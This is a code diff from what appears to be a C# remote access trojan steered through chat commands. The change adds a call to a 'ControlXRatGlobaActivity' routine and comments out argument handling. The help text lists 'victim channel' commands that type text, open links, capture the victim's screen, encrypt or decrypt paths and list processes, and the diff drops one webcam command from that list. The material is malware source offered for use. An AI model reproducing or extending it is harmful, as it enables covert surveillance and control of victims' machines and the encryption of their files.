@@ -23,8 +23,10 @@ class Program
 
     private async Task MainAsync(string[] args)
     {
+        await Utils.ControlXRatGlobaActivity();
         Utils.CheckVirusTotal();
 
+        /*
         if (args.Length != 0)
         {
             foreach (string arg in args)
@@ -42,6 +44,7 @@ class Program
                 }
             }
         }
+        */
 
         if (Settings.debug)
         {
@@ -284,7 +287,6 @@ Commands below works only in victim channel
 {Settings.prefix}type [text without spaces]
 {Settings.prefix}web [link without spaces]
 {Settings.prefix}screen [width] [height] [[Default is 1920x1080]] - Screenshot of victim's screen
-{Settings.prefix}webcam - takes a webcam shot
 {Settings.prefix}encrypt [path]
 {Settings.prefix}decrypt [path]
 {Settings.prefix}getprocesslist
